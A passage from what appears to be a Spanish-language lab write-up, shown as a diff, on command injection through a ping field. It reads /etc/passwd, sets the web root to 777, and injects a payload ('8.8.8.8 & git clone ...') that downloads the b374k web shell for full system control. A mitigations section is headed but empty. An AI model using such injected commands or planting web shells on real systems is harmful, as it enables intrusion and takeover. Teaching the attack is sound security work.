@@ -30,3 +30,39 @@ Devueve el resultado del ping y ademas devuelve el resultado del comando id:
 
 ![ping](./Imagenes/3.png)
 
+Ahora vamos a listar archivos:
+
+![ping](./Imagenes/4.png)
+
+Vamos a leer el contenido de ***/etc/passwd***:
+
+![ping](./Imagenes/5.png)
+
+Ahora vamos a realizar la prueba de intentar ejecutar malware:
+
+Primero le damos permisos a */var/www/html* en nuestro contenedor:
+
+```
+sudo chmod -R 777 /var/www/html/
+```
+Y ahora intentamos descargarnos el malware desde un repositorio de git:
+
+```
+8.8.8.8 & git clone https://github.com/b374k/b374k.git /var/www/html/b374k
+```
+
+
+Al ejecutarse se habra descargado la carpeta **b374k** y dentro de ella varios archivos, entre ellos, **index.html** , que si accedemos a el pode¡remos ejecutar los comandos que queramos:
+
+![ping](./Imagenes/6.png)
+
+![ping](./Imagenes/7.png)
+
+Ya tendriamos el control total del sistema.
+
+## Mitigaciones de RCE
+
+
+Una vez explotadas la vulnerabilidades vamos a ver como mitigarlas:
+
+
